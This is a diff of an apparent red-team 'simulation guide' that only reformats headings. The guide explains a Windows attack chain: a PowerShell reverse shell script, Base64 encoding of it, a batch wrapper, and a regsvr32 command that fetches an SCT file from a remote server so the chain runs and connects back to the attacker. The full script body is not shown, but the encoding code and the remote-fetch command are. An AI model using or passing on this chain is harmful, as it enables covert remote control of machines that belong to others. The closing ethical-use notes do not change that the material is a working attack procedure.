@@ -1,4 +1,4 @@
-Step-by-Step Simulation Guide Note: Files available for adapting in repository .
+# Step-by-Step Simulation Guide Note: Files available for adapting in repository.
 
 1. Create the Reverse Shell PowerShell Script
 Create a file named reverse_shell.ps1 with the following content:
@@ -39,7 +39,7 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
 $encoded = [Convert]::ToBase64String($bytes)
 $encoded
 
-Copy the resulting Base64 string.
+# Copy the resulting Base64 string.
 
 3. Create the Batch File
 Create a file named run_reverse_shell.bat with the following content. Replace <Base64_encoded_string> with the Base64 string you copied:
@@ -72,7 +72,7 @@ regsvr32 /s /i:http://yourserver.com/reverse_shell.sct scrobj.dll
 When the SCT file is executed, it will download and run the batch file, which will decode and execute the PowerShell script to establish a reverse shell connection to the specified IP and port.
 
 
-Important Notes:
+# Important Notes:
 Ethical Use: Ensure you have explicit permission to test systems with this script. Unauthorised use is illegal and unethical.
 Controlled Environment: Use a controlled environment for testing.
 Troubleshooting: Keep a non-obfuscated version of the scripts for troubleshooting and maintenance.
